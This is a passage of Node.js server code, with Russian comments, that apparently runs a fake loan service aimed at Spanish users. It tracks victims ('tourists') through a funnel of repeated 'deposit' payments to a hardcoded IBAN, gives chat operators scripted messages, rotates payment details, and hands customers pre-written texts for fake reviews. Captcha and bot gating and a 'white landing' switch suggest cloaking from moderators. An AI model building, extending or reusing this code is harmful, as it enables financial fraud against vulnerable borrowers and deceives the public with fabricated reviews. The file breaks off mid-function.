import { appendFile, mkdir, readFile, writeFile } from 'node:fs/promises';
import { createWriteStream as fsCreateWriteStream } from 'node:fs';
import { pipeline } from 'node:stream/promises';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { config } from './config.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const CHAT_PROMPT_FILE = join(__dirname, '..', 'chat-prompt.md');
const TRANSLATE_PROMPT_FILE = join(__dirname, '..', 'translate-prompt.md');
import { createAccessToken, isGranted } from './grantStore.js';
import { HUMAN_UI, BOT_UI } from './humanUi.js';
import { maskName, maskPhone, sanitizeString } from './mask.js';
import { sendToTelegram, sendToTelegramWithButton, sendTelegramReturningId, editTelegramMessage } from './telegram.js';
import { classifyClient } from './financiar24.js';
import { lookupGeoByIp } from './geoLookup.js';
import { prisma } from './db.js';
import { getBotConfig, updateBotConfig } from './ai/botConfig.js';
import { aiChat, providerHasKey } from './ai/chat.js';
import { setApiKey, clearApiKey, listCredentials, maskKey, CREDENTIAL_PROVIDERS } from './ai/credentials.js';
import { sendPlainToTelegram } from './telegram.js';
import { queueTranslation, isTranslatable, DEFAULT_TRANSLATE_PROMPT } from './ai/translator.js';
import { buildSystemPrompt } from './ai/promptBuilder.js';
import {
  applyChatPaymentDetails,
  extractChatPaymentDetails,
  extractUserPaymentDetails,
  getClientPaymentDetails,
  getClientTransferDescription,
  normalizeBizum,
} from './chatPaymentDetails.js';
import { createHash, randomUUID, timingSafeEqual } from 'node:crypto';
import { sendPush } from './firebase.js';

// ── Captcha-passed sessions (in-memory; reset on restart) ────────────────────
const captchaPassedSessions = new Set();
const tokenToSession = new Map(); // accessToken → flowSessionId

// ── Sessions with 72-hour TTL, persisted to disk ─────────────────────────────
const SESSION_TTL = 72 * 60 * 60 * 1000;
const SESSIONS_FILE = join(process.cwd(), 'data', 'sessions.json');
// Maps: token -> expiresAt (ms timestamp)
const adminSessions = new Map();
const chatOpSessions = new Map();
// token -> handlerId (null = .env all-access chat-op, видит все лиды)
const chatOpHandlers = new Map();

function sessionValid(map, token) {
  const exp = map.get(token);
  if (!exp) return false;
  if (Date.now() > exp) { map.delete(token); return false; }
  return true;
}

function sessionAdd(map, token) {
  map.set(token, Date.now() + SESSION_TTL);
  saveSessions();
}

function saveSessions() {
  const data = {
    admin:  Object.fromEntries(adminSessions),
    chatOp: Object.fromEntries(chatOpSessions),
    chatOpHandlers: Object.fromEntries(chatOpHandlers),
  };
  mkdir(join(process.cwd(), 'data'), { recursive: true })
    .then(() => writeFile(SESSIONS_FILE, JSON.stringify(data), 'utf8'))
    .catch(() => {});
}

async function loadSessions() {
  try {
    const raw = JSON.parse(await readFile(SESSIONS_FILE, 'utf8'));
    const now = Date.now();
    for (const [t, exp] of Object.entries(raw.admin  || {})) if (exp > now) adminSessions.set(t, exp);
    for (const [t, exp] of Object.entries(raw.chatOp || {})) if (exp > now) chatOpSessions.set(t, exp);
    for (const [t, hid] of Object.entries(raw.chatOpHandlers || {})) if (chatOpSessions.has(t)) chatOpHandlers.set(t, hid);
  } catch { /* first run or corrupt file — start fresh */ }
}
await loadSessions();

// handlerId залогиненного чат-оператора (null = all-access .env-логин).
function chatOpHandlerId(req) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  return chatOpHandlers.get(token) ?? null;
}

// ── Payment screenshot status ─────────────────────────────────────────────────
const PAYMENT_STATUS_FILE = join(process.cwd(), 'data', 'payment-status.json');
const paymentStatus = new Map(); // key -> { status: 'pending'|'confirmed'|'rejected', url, sentAt, type }
function normalizePaymentType(type) {
  if (type === 'loantransfer' || type === 'loan-transfer') return 'loantransfer';
  // `rd2` остаётся алиасом старой кредитной оплаты: новый RD2 имеет отдельный тип loantransfer.
  if (type === 'creditcard' || type === 'rd3' || type === 'rd2') return 'creditcard';
  return type === 'return' ? 'return' : 'insurance';
}
function paymentStatusKey(sessionId, type) {
  const normalized = normalizePaymentType(type);
  if (normalized === 'return') return `${sessionId}::return`;
  if (normalized === 'loantransfer') return `${sessionId}::loantransfer`;
  if (normalized === 'creditcard') return `${sessionId}::creditcard`;
  return sessionId;
}
function getPaymentStatus(sessionId, type) {
  return paymentStatus.get(paymentStatusKey(sessionId, type)) || { status: 'none', type: normalizePaymentType(type) };
}
function hasPendingPayment(sessionId) {
  return getPaymentStatus(sessionId, 'insurance').status === 'pending'
    || getPaymentStatus(sessionId, 'return').status === 'pending'
    || getPaymentStatus(sessionId, 'loantransfer').status === 'pending'
    || getPaymentStatus(sessionId, 'creditcard').status === 'pending';
}
function parsePaymentScreenshotMessage(message) {
  if (typeof message !== 'string') return null;
  if (message.startsWith('PAYMENT_SCREENSHOT_LOAN_TRANSFER:')) {
    return { type: 'loantransfer', url: message.slice('PAYMENT_SCREENSHOT_LOAN_TRANSFER:'.length) };
  }
  if (message.startsWith('PAYMENT_SCREENSHOT_CREDIT_CARD:')) {
    return { type: 'creditcard', url: message.slice('PAYMENT_SCREENSHOT_CREDIT_CARD:'.length) };
  }
  if (message.startsWith('PAYMENT_SCREENSHOT_RETURN:')) {
    return { type: 'return', url: message.slice('PAYMENT_SCREENSHOT_RETURN:'.length) };
  }
  if (message.startsWith('PAYMENT_SCREENSHOT:')) {
    return { type: 'insurance', url: message.slice('PAYMENT_SCREENSHOT:'.length) };
  }
  return null;
}
async function savePaymentStatus() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    const obj = {};
    for (const [k, v] of paymentStatus) obj[k] = v;
    await writeFile(PAYMENT_STATUS_FILE, JSON.stringify(obj), 'utf8');
  } catch {}
}
async function loadPaymentStatus() {
  try {
    const data = JSON.parse(await readFile(PAYMENT_STATUS_FILE, 'utf8'));
    for (const [k, v] of Object.entries(data)) paymentStatus.set(k, v);
  } catch {}
}
await loadPaymentStatus();

// ── Payment requisites status ────────────────────────────────────────────────
// A payment screenshot after a requisites update is a stop signal for operators.
// Statuses are kept outside the database so this feature does not require a schema migration.
const REQUISITE_STATUS_FILE = join(process.cwd(), 'data', 'payment-requisites-status.json');
const REQUISITE_SUN_WINDOW_MS = 24 * 60 * 60 * 1000;
const REQUISITE_CLOUD_WINDOW_MS = 48 * 60 * 60 * 1000;
const requisiteStatusBySession = new Map(); // sessionId -> { status: 'snowflake'|'sun', changedAt }

function getRequisiteStatus(sessionId, now = Date.now()) {
  const entry = requisiteStatusBySession.get(sessionId);
  const changedAt = Number(entry?.changedAt);
  if (!entry || !Number.isFinite(changedAt)) return 'none';
  if (entry.status === 'snowflake') return 'snowflake';
  if (entry.status !== 'sun') return 'none';
  const age = now - changedAt;
  if (age < REQUISITE_SUN_WINDOW_MS) return 'sun';
  if (age < REQUISITE_SUN_WINDOW_MS + REQUISITE_CLOUD_WINDOW_MS) return 'cloud';
  return 'none';
}

async function saveRequisiteStatuses() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    await writeFile(REQUISITE_STATUS_FILE, JSON.stringify(Object.fromEntries(requisiteStatusBySession), null, 2), 'utf8');
  } catch (e) {
    console.error('[payment-requisites-status] write error:', e?.message);
  }
}

async function loadRequisiteStatuses() {
  try {
    const stored = JSON.parse(await readFile(REQUISITE_STATUS_FILE, 'utf8'));
    for (const [sessionId, entry] of Object.entries(stored || {})) {
      if ((entry?.status === 'snowflake' || entry?.status === 'sun') && Number.isFinite(Number(entry.changedAt))) {
        requisiteStatusBySession.set(sessionId, { status: entry.status, changedAt: Number(entry.changedAt) });
      }
    }
  } catch { /* first run or an empty file */ }
}
await loadRequisiteStatuses();

async function markRequisitePayment(sessionId) {
  const settings = await readSettings();
  if (!settings.paymentRequisitesUpdatedAt) return false;
  requisiteStatusBySession.set(sessionId, { status: 'snowflake', changedAt: Date.now() });
  await saveRequisiteStatuses();
  return true;
}

async function refreshPaymentRequisites() {
  const changedAt = Date.now();
  const settings = await readSettings();
  settings.paymentRequisitesUpdatedAt = new Date(changedAt).toISOString();
  await writeSettings(settings);
  let movedToSun = 0;
  for (const [sessionId] of requisiteStatusBySession) {
    if (getRequisiteStatus(sessionId, changedAt) === 'snowflake') {
      requisiteStatusBySession.set(sessionId, { status: 'sun', changedAt });
      movedToSun += 1;
    }
  }
  await saveRequisiteStatuses();
  return { changedAt, movedToSun };
}

function getRequisiteStatusCounts(sessionIds, now = Date.now()) {
  const counts = { snowflake: 0, sun: 0, cloud: 0 };
  for (const sessionId of sessionIds) {
    const status = getRequisiteStatus(sessionId, now);
    if (status in counts) counts[status] += 1;
  }
  return counts;
}

// ── App settings (IBAN / beneficiario / SMS reminders) ─────────────────────────
const SETTINGS_FILE = join(process.cwd(), 'data', 'app-settings.json');
const DEFAULT_SETTINGS = {
  paymentType: 'iban',
  iban: 'ES24 2080 9230 2150 3773 6219',
  beneficiario: 'Peter Harington',
  comentario: 'ES-4738D9215',
  swiftBic: '',
  paisDestino: 'Lituania',
  paymentUnavailable: false,
  landingWhiteEnabled: false,
  paymentRequisitesUpdatedAt: null,
  smsReminderEnabled: false,
  smsReminderEnabledAt: null,
  smsReminderMinutes: 20,
  smsReminderSender: 'AvalAvance',
  smsReminderText: 'Привет',
  routingHandlerId: null, // активный обработчик, которому назначаются новые лиды
  depositFD: 100, // сумма депозита за 1-ю оплату (insurance)
  depositRD: 190, // сумма депозита за 2-ю оплату (return)
  depositRD2: 200, // сумма депозита за перенос кредита (loantransfer)
  depositRD3: 250, // сумма депозита за оплату кредитки (creditcard)
  // Сценарий обработки — тексты для панели «Этапы обработки» у чат-оператора.
  // Оператор шлёт их в один клик, поэтому правятся только в админке.
  scenarioFdWelcomeMsg: '',
  scenarioFdWelcomeSms: '',
  scenarioFdPaidMsg: '',
  scenarioFdPaidSms: '',
  scenarioRdIbanReq: '',
  scenarioRdChargeSms: '',
  scenarioRdPaymentSet: '',
  scenarioRdPayReq: '',
  scenarioRdThanks: '',
  scenarioRd2StartMsg: '',
  scenarioRd2StartMsg2: '',
  scenarioRd2PaidNotify: '',
  scenarioRd2Sms: '',
  scenarioRd2PayReq: '',
};

// Поля сценария, которые отдаём/принимаем как единый блок.
const SCENARIO_FIELDS = [
  'scenarioFdWelcomeMsg', 'scenarioFdWelcomeSms', 'scenarioFdPaidMsg', 'scenarioFdPaidSms',
  'scenarioRdIbanReq', 'scenarioRdChargeSms', 'scenarioRdPaymentSet', 'scenarioRdPayReq', 'scenarioRdThanks',
  'scenarioRd2StartMsg', 'scenarioRd2StartMsg2', 'scenarioRd2PaidNotify', 'scenarioRd2Sms', 'scenarioRd2PayReq',
];
function scenarioPayload(settings) {
  const out = {};
  for (const key of SCENARIO_FIELDS) out[key] = settings[key] || '';
  return out;
}
async function readSettings() {
  try { return { ...DEFAULT_SETTINGS, ...JSON.parse(await readFile(SETTINGS_FILE, 'utf8')) }; }
  catch { return { ...DEFAULT_SETTINGS }; }
}
function depositRD3Amount(settings) {
  return Number(settings.depositRD3 ?? 250);
}
function depositRD2Amount(settings) {
  return Number(settings.depositRD2 ?? 200);
}
async function writeSettings(data) {
  try { await mkdir(join(process.cwd(), 'data'), { recursive: true }); await writeFile(SETTINGS_FILE, JSON.stringify(data, null, 2), 'utf8'); }
  catch (e) { console.error('[settings] write error:', e?.message); }
}

// ── Банки для RD2 (смена кредитора) ───────────────────────────────────────────
// Те же, что клиент видит на странице выбора банка. Один список на всех:
// им пользуются и модалка оператора, и страница переноса кредита.
// Иконку отдаём через /api/, а не прямой ссылкой на /assets/banks/: операторская
// панель живёт на своём домене, куда nginx клиентскую статику не пускает.
const RD2_BANKS = [
  { key: 'bbva',       name: 'BBVA',           icon: '/api/bank-icon/bbva' },
  { key: 'sabadell',   name: 'Banco Sabadell', icon: '/api/bank-icon/sabadell' },
  { key: 'openbank',   name: 'Openbank',       icon: '/api/bank-icon/openbank' },
  { key: 'caixabank',  name: 'CaixaBank',      icon: '/api/bank-icon/caixabank' },
  { key: 'ing',        name: 'ING Bank',       icon: '/api/bank-icon/ing' },
  { key: 'santander',  name: 'Santander',      icon: '/api/bank-icon/santander' },
  { key: 'imaginbank', name: 'ImaginBank',     icon: '/api/bank-icon/imaginbank' },
  { key: 'deutschebank', name: 'Deutsche Bank', icon: '/api/bank-icon/deutschebank' },
  { key: 'cajamar',    name: 'Cajamar Caja Rural', icon: '/api/bank-icon/cajamar' },
  { key: 'revolut',    name: 'Revolut',        icon: '/api/bank-icon/revolut' },
  { key: 'ruralvia',   name: 'Ruralvía',       icon: '/api/bank-icon/ruralvia', iconFile: 'icon.png' },
  { key: 'n26',        name: 'N26',            icon: '/api/bank-icon/n26' },
  { key: 'otrobanco',  name: 'Otro Banco',     icon: '/api/bank-icon/otrobanco' },
];

async function handleGetBanks(req, reply) {
  return reply.send({ banks: RD2_BANKS });
}

// Файл иконки. Ключ сверяем со справочником — путь из запроса в fs не уходит.
async function handleBankIcon(req, reply) {
  const key = sanitizeString(String(req.params?.key || ''), 40);
  const bank = RD2_BANKS.find((b) => b.key === key);
  if (!bank) return reply.status(404).send({ error: 'unknown bank' });
  try {
    const iconFile = bank.iconFile || 'icon.svg';
    const iconType = iconFile.toLowerCase().endsWith('.png') ? 'image/png' : 'image/svg+xml';
    const icon = await readFile(join(process.cwd(), 'assets', 'banks', key, iconFile));
    return reply
      .type(iconType)
      .header('Cache-Control', 'public, max-age=86400')
      .header('Access-Control-Allow-Origin', '*')
      .send(icon);
  } catch (err) {
    console.error('[bank-icon]', key, err?.message);
    return reply.status(404).send({ error: 'not_found' });
  }
}

// Оператор выбирает банк-получателя — клиент видит его на странице переноса.
async function handleChatOpSetRd2Bank(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const key = sanitizeString(getString(body.bankKey), 40);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });

    // Пустой ключ — сброс к состоянию «банк не выбран».
    const bank = key ? RD2_BANKS.find((b) => b.key === key) : null;
    if (key && !bank) return reply.status(400).send({ error: 'unknown bank' });

    await mergeSubmissionData(sessionId, { rd2Bank: bank ? { key: bank.key, name: bank.name, icon: bank.icon } : null });
    pushClientEvent(sessionId, { type: 'rd2bank', bank });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, bank });
  } catch (err) {
    console.error('[chat-op/rd2-bank]', err?.message || err);
    return reply.status(500).send({ error: 'save_failed' });
  }
}

// ── Тексты отзывов ────────────────────────────────────────────────────────────
// Пул заготовок, которые админ заводит вручную. Каждому клиенту достаётся своя,
// чтобы отзывы не были под копирку. Жизненный цикл статуса:
//   free      — ещё никому не выдан;
//   offered   — показан клиенту на странице отзыва (закреплён за ним);
//   cancelled — клиент нажал «сейчас не буду»;
//   approved  — клиент прислал скриншот своего отзыва.
// Админ может переставить статус вручную в любой момент.
const REVIEW_TEXTS_FILE = join(process.cwd(), 'data', 'review-texts.json');
const REVIEW_STATUSES = new Set(['free', 'offered', 'cancelled', 'approved']);

async function readReviewTexts() {
  try {
    const parsed = JSON.parse(await readFile(REVIEW_TEXTS_FILE, 'utf8'));
    return Array.isArray(parsed?.texts) ? parsed.texts : [];
  } catch { return []; }
}
async function writeReviewTexts(texts) {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    await writeFile(REVIEW_TEXTS_FILE, JSON.stringify({ texts }, null, 2), 'utf8');
  } catch (e) { console.error('[review-texts] write error:', e?.message); }
}

// ── Общие заметки чат-операторов (на сервере, не на куках) ────────────────────
const NOTES_FILE = join(process.cwd(), 'data', 'notes.json');
const LEGACY_OPERATOR_LOGIN = 'OBRAB1';
let legacyOperatorHandlerIdPromise = null;

async function legacyOperatorHandlerId() {
  if (!legacyOperatorHandlerIdPromise) {
    legacyOperatorHandlerIdPromise = (async () => {
      try {
        const handlers = await prisma.handler.findMany({ select: { id: true, name: true, login: true } });
        const needle = LEGACY_OPERATOR_LOGIN.toLowerCase();
        const found = handlers.find((h) =>
          String(h.login || '').toLowerCase() === needle ||
          String(h.name || '').toLowerCase() === needle
        );
        if (found?.id) return found.id;
      } catch (e) {
        console.warn('[legacy-owner] handler lookup failed:', e?.message || e);
      }
      try {
        const settings = await readSettings();
        return settings.routingHandlerId || null;
      } catch {
        return null;
      }
    })();
  }
  return legacyOperatorHandlerIdPromise;
}

async function assignLegacyNotes(notes) {
  if (!notes.some((n) => n && !n.handlerId)) return notes;
  const handlerId = await legacyOperatorHandlerId();
  if (!handlerId) return notes;
  const updated = notes.map((n) => (n && !n.handlerId ? { ...n, handlerId } : n));
  await writeNotes(updated);
  return updated;
}

async function readNotes() {
  try {
    const parsed = JSON.parse(await readFile(NOTES_FILE, 'utf8'));
    const notes = Array.isArray(parsed?.notes) ? parsed.notes : [];
    return assignLegacyNotes(notes);
  } catch { return []; }
}
async function writeNotes(notes) {
  try { await mkdir(join(process.cwd(), 'data'), { recursive: true }); await writeFile(NOTES_FILE, JSON.stringify({ notes }, null, 2), 'utf8'); }
  catch (e) { console.error('[notes] write error:', e?.message); }
}

// ── SSE broadcast ─────────────────────────────────────────────────────────────
const sseClients = new Set();

function broadcastUpdate(type = 'clients_changed') {
  const msg = `data: ${JSON.stringify({ type })}\n\n`;
  for (const raw of [...sseClients]) {
    try { raw.write(msg); } catch { sseClients.delete(raw); }
  }
}

// Оповестить всех подключённых по SSE, что список клиентов/статусы изменились.
function notifyClients() { broadcastUpdate('clients_changed'); }

// ── Клиентский SSE (по flowSessionId) — мгновенный сигнал на страницы туриста ──
// flowSessionId -> Set<raw res>. Используется для моментального редиректа в «ожидание».
const clientSseBySession = new Map();

function pushClientEvent(flowSessionId, payload) {
  const set = clientSseBySession.get(flowSessionId);
  if (!set) return;
  const msg = `data: ${JSON.stringify(payload)}\n\n`;
  for (const raw of [...set]) {
    try { raw.write(msg); } catch { set.delete(raw); }
  }
}

function requireAdmin(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || !sessionValid(adminSessions, token)) {
    reply.status(401).send({ error: 'Unauthorized' });
    return false;
  }
  return true;
}

// ── WebClient helpers ─────────────────────────────────────────────────────────
const STATUS_MAP = {
  tourist_bank_selected:        'КЛИЕНТ ВЫБРАЛ БАНК',
  tourist_benefit_reached:      'КЛИЕНТ ДОШЕЛ ДО LINK-BENEFIT',
  tourist_chat_reached:         'КЛИЕНТ ДОШЕЛ ДО ЧАТА',
  tourist_bot_started:          'БОТ НАЧАЛ ДИАЛОГ',
  tourist_bot_finished_dialogue:'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_bot_finished:         'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_card_page_opened:     'ОТКРЫЛ ФОРМУ',
  tourist_card_ordered:         'КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
  tourist_call_requested:       'ЗАПРОСИЛ ЗВОНОК',
};

// ── Статусы воронки (как в разделе «Статистика») ──────────────────────────────
// Показываются в списке клиентов и в фильтре. Это ПРОИЗВОДНОЕ значение:
// вычисляется из событий/капчи/оплат и НЕ перезаписывает рабочий webClient.status
// (по которому работает панель оператора/чата).
export const FUNNEL_STATUSES = [
  'ПРОШЁЛ КАПЧУ',
  'БОТ НАЧАЛ ДИАЛОГ',
  'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  'ПОДПИСАЛ ДОГОВОР',
  'БОТ-2 НАЧАЛ ДИАЛОГ',
  'БОТ-2 ЗАКОНЧИЛ ДИАЛОГ',
  'НАЧАЛАСЬ ОБРАБОТКА',
  'ОПЛАТИЛ FD',
  'ОПЛАТИЛ RD',
  'ОПЛАТИЛ RD2',
  'ОПЛАТИЛ RD3',
];
const FUNNEL_RANK = new Map(FUNNEL_STATUSES.map((s, i) => [s, i]));

// События воронки, которые нас интересуют (bot2-события создаются с clientId=null,
// поэтому по relation client.events их НЕ видно — берём строго по flowSessionId).
const FUNNEL_EVENTS = [
  'tourist_bot_started',
  'tourist_bot_finished_dialogue',
  'tourist_bot_finished',
  'tourist_card_ordered',
  'tourist_bot2_started',
  'tourist_bot2_finished',
];

// Последний достигнутый шаг для одного клиента.
// ev — Set событий (по flowSessionId), processingStarted — нажат ли Start оператором.
function funnelStatusFor(client, ev, processingStarted) {
  const sid = client.flowSessionId;
  if (getPaymentStatus(sid, 'creditcard').status === 'confirmed') return 'ОПЛАТИЛ RD3';
  if (getPaymentStatus(sid, 'loantransfer').status === 'confirmed') return 'ОПЛАТИЛ RD2';
  if (getPaymentStatus(sid, 'return').status === 'confirmed') return 'ОПЛАТИЛ RD';
  if (getPaymentStatus(sid, 'insurance').status === 'confirmed') return 'ОПЛАТИЛ FD';
  if (processingStarted || (client.operatorStatus && client.operatorStatus !== 'pending')) return 'НАЧАЛАСЬ ОБРАБОТКА';
  if (ev.has('tourist_bot2_finished')) return 'БОТ-2 ЗАКОНЧИЛ ДИАЛОГ';
  if (ev.has('tourist_bot2_started')) return 'БОТ-2 НАЧАЛ ДИАЛОГ';
  if (ev.has('tourist_card_ordered')) return 'ПОДПИСАЛ ДОГОВОР';
  if (ev.has('tourist_bot_finished_dialogue') || ev.has('tourist_bot_finished')) return 'БОТ ЗАКОНЧИЛ ДИАЛОГ';
  if (ev.has('tourist_bot_started')) return 'БОТ НАЧАЛ ДИАЛОГ';
  if (client.captchaPassed) return 'ПРОШЁЛ КАПЧУ';
  return null;
}

// Считает статусы воронки для набора клиентов — теми же источниками, что «Статистика»:
// события по flowSessionId + маркер CALLER_ACTION_BUTTONS (начало обработки) + оплаты.
// Возвращает Map<flowSessionId, статус|null>.
export async function computeFunnelMap(clients) {
  const sids = clients.map((c) => c.flowSessionId).filter(Boolean);
  const eventsBySid = new Map(); // sid -> Set<event>
  const processingSids = new Set();
  if (sids.length) {
    try {
      const rows = await prisma.webEvent.findMany({
        where: { flowSessionId: { in: sids }, event: { in: FUNNEL_EVENTS } },
        select: { flowSessionId: true, event: true },
      });
      for (const r of rows) {
        let set = eventsBySid.get(r.flowSessionId);
        if (!set) { set = new Set(); eventsBySid.set(r.flowSessionId, set); }
        set.add(r.event);
      }
    } catch (e) { console.error('[funnel/events]', e?.message); }
    try {
      const chatKeys = sids.map((s) => chatLeadKey(s));
      const rows = await prisma.message.findMany({
        where: { content: 'CALLER_ACTION_BUTTONS', lead: { tgId: { in: chatKeys } } },
        select: { leadId: true, lead: { select: { tgId: true } } },
        distinct: ['leadId'],
      });
      for (const r of rows) {
        const tg = r.lead?.tgId || '';
        if (tg.startsWith('chat:')) processingSids.add(tg.slice('chat:'.length));
      }
    } catch (e) { console.error('[funnel/processing]', e?.message); }
  }
  const map = new Map();
  for (const c of clients) {
    map.set(c.flowSessionId, funnelStatusFor(c, eventsBySid.get(c.flowSessionId) || new Set(), processingSids.has(c.flowSessionId)));
  }
  return map;
}

async function upsertWebClient(flowSessionId, patch = {}) {
  if (!flowSessionId) return null;
  try {
    return await prisma.webClient.upsert({
      where: { flowSessionId },
      create: { flowSessionId, ...patch },
      update: patch,
    });
  } catch { return null; }
}

async function createWebEvent(flowSessionId, clientId, event, extra = {}) {
  try {
    await prisma.webEvent.create({
      data: { flowSessionId, clientId: clientId || null, event, ...extra },
    });
  } catch { /* non-fatal */ }
}

// Отмечаем, что сессия прошла капчу: в памяти (быстро) + в БД (переживает рестарт).
async function markCaptchaPassed(sessionId) {
  if (!sessionId) return;
  captchaPassedSessions.add(sessionId);
  try {
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      create: { flowSessionId: sessionId, captchaPassed: true },
      update: { captchaPassed: true },
    });
  } catch (e) { console.error('[captcha] persist error:', e?.message || e); }
}

// Прошла ли сессия капчу: сначала память, при промахе — БД (и прогреваем кэш).
async function hasCaptchaPassed(sessionId) {
  if (!sessionId) return false;
  if (captchaPassedSessions.has(sessionId)) return true;
  try {
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { captchaPassed: true },
    });
    if (wc?.captchaPassed) { captchaPassedSessions.add(sessionId); return true; }
  } catch { /* колонка может ещё не существовать — не блокируем */ }
  return false;
}

// Определяет новичок/турист через financiar24, сохраняет clientType и шлёт в TG.
// Вызывается fire-and-forget из scratch-verify, чтобы не тормозить ответ капчи.
async function classifyAndNotifyClientType(flowSessionId, email, phone, ctx = {}) {
  if (!email || !phone) return;
  try {
    const result = await classifyClient({ email, phone });
    console.log(`[client-type] session=${flowSessionId || '-'} email=${email} → ${result.clientType || 'unknown'} (${result.reason || result.raw || ''})`);

    if (result.clientType && flowSessionId) {
      await upsertWebClient(flowSessionId, { clientType: result.clientType, email });
    }

    const icon = result.isTourist ? '🧳' : result.isTourist === false ? '🆕' : '❔';
    const verdict = result.clientType
      ? `${icon} *${result.label}* (\`${result.clientType}\`)`
      : `❔ *не определён* (${result.reason || 'нет данных'})`;
    const lines = [
      '*🔎 ПРОВЕРКА financiar24*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      `Email: ${email}`,
      `Тел: ${phone}`,
      ctx.country ? `Страна: *${ctx.country}*` : '',
      `Результат: ${verdict}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));
  } catch (err) {
    console.error('[client-type] classify error:', err?.message || err);
  }
}

const logDir = join(tmpdir(), config.logDirName);
const scratchLogFile = join(logDir, 'scratch-verify.log');
const smsLogFile = join(process.cwd(), 'data', 'sms-log.jsonl');

let logDirReady = false;
async function ensureLogDir() {
  if (logDirReady) return;
  try {
    await mkdir(logDir, { recursive: true });
    logDirReady = true;
  } catch (err) {
    if (err?.code === 'EEXIST') logDirReady = true;
    else console.error('Failed to create log dir:', err);
  }
}

async function appendJsonLine(file, entry) {
  try {
    await ensureLogDir();
    await appendFile(file, `${JSON.stringify(entry)}\n`);
  } catch (err) {
    console.error('Failed to append log:', err);
  }
}

function asRecord(v) {
  return v && typeof v === 'object' && !Array.isArray(v) ? v : null;
}
function getString(v) { return typeof v === 'string' ? v : ''; }
function getNumber(v) { return typeof v === 'number' && Number.isFinite(v) ? v : null; }
function getBoolean(v) { return typeof v === 'boolean' ? v : null; }

function getHeader(req, name) {
  const v = req.headers[name];
  if (Array.isArray(v)) return typeof v[0] === 'string' ? v[0].trim() : '';
  return typeof v === 'string' ? v.trim() : '';
}

function getClientIp(req) {
  const headers = ['cf-connecting-ip', 'true-client-ip', 'x-real-ip', 'x-client-ip', 'fly-client-ip'];
  let ip = '';
  for (const h of headers) {
    ip = getHeader(req, h);
    if (ip) break;
  }
  if (!ip) {
    const fwd = getHeader(req, 'x-forwarded-for');
    ip = fwd ? (fwd.split(',')[0]?.trim() ?? '') : '';
  }
  if (!ip) ip = req.ip || req.socket?.remoteAddress || '';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}

// ── Ограничение частоты запросов ──────────────────────────────────────────────
// Свой лимитер в памяти, без новой зависимости: подбор пароля к панелям и
// заливка мусора в /uploads иначе ничем не ограничены. Счётчики живут до
// перезапуска — этого достаточно, чтобы отсечь перебор.
const rateBuckets = new Map(); // "имя:ip" -> { count, resetAt }

function rateLimited(req, reply, name, limit, windowMs) {
  const key = `${name}:${getClientIp(req) || 'unknown'}`;
  const now = Date.now();
  const bucket = rateBuckets.get(key);

  if (!bucket || now >= bucket.resetAt) {
    rateBuckets.set(key, { count: 1, resetAt: now + windowMs });
  } else if (bucket.count >= limit) {
    const retryAfter = Math.ceil((bucket.resetAt - now) / 1000);
    reply.status(429).header('Retry-After', String(retryAfter))
      .send({ error: 'too_many_requests', retryAfter });
    return true;
  } else {
    bucket.count += 1;
  }

  // Подчищаем протухшие корзины, чтобы Map не рос бесконечно.
  if (rateBuckets.size > 5000) {
    for (const [k, b] of rateBuckets) if (now >= b.resetAt) rateBuckets.delete(k);
  }
  return false;
}

// Успешный вход снимает счётчик — оператор с опечаткой не блокирует себя.
function rateReset(req, name) {
  rateBuckets.delete(`${name}:${getClientIp(req) || 'unknown'}`);
}

// Сравнение секретов без утечки по времени.
function safeEqual(a, b) {
  const x = Buffer.from(String(a ?? ''), 'utf8');
  const y = Buffer.from(String(b ?? ''), 'utf8');
  if (x.length !== y.length) return false;
  return timingSafeEqual(x, y);
}

function getGeoFromHeaders(req) {
  const country =
    getHeader(req, 'cf-ipcountry') ||
    getHeader(req, 'x-vercel-ip-country') ||
    getHeader(req, 'cloudfront-viewer-country') ||
    getHeader(req, 'x-country-code');
  if (!country || country.toUpperCase() === 'XX' || country.toUpperCase() === 'UNKNOWN') return null;
  return {
    country: country.toUpperCase(),
    city: getHeader(req, 'x-vercel-ip-city') || '',
    region: getHeader(req, 'x-vercel-ip-country-region') || '',
  };
}

async function resolveGeo(req, ip) {
  const headerGeo = getGeoFromHeaders(req);
  if (headerGeo) return { available: true, geo: headerGeo, source: 'headers' };
  return lookupGeoByIp(ip);
}

function buildBotResponse(flowSessionId, extra = {}) {
  const { token, shortId } = createAccessToken();
  if (flowSessionId) tokenToSession.set(token, flowSessionId);
  const json = {
    status: true,
    url: config.redirects.botRedirectUrl || '',
    ui: BOT_UI,
    accessToken: token,
    allowed: false,
    ...extra,
  };
  return { shortId, json };
}

function sendGrantButton(message, shortId) {
  console.log(`[TG] sending grant button (shortId=${shortId})`);
  sendToTelegramWithButton(
    `${message}\n\n_Нажмите кнопку чтобы дать пользователю доступ._`,
    `grant_${shortId}`,
  );
}

async function handleScratchAccess(req, reply) {
  const token = req.params.token || '';
  if (!token) return reply.status(400).send({ allowed: false });
  reply.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  reply.header('Pragma', 'no-cache');
  reply.header('Expires', '0');
  if (!isGranted(token)) return reply.send({ allowed: false });
  const grantedSession = tokenToSession.get(token);
  if (grantedSession) await markCaptchaPassed(grantedSession);
  return reply.send({
